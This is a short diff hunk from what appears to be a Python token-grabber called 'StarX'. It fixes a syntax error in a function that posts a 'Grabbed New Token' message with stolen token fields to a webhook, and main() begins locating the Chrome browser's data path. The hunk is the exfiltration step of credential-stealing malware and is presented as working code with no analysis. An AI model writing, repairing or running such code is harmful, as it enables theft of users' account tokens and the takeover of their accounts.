@@ -89,7 +89,7 @@ def send_tokens_to_webhook(
         })
     data = {"content": "StarX >> Grabbed New Token", "embeds": [{"fields": fields}]}
 
-    make_post_request(webhook_url, data
+    make_post_request(webhook_url, data)
 def main() -> None:
 
     chrome_path = os.path.join(
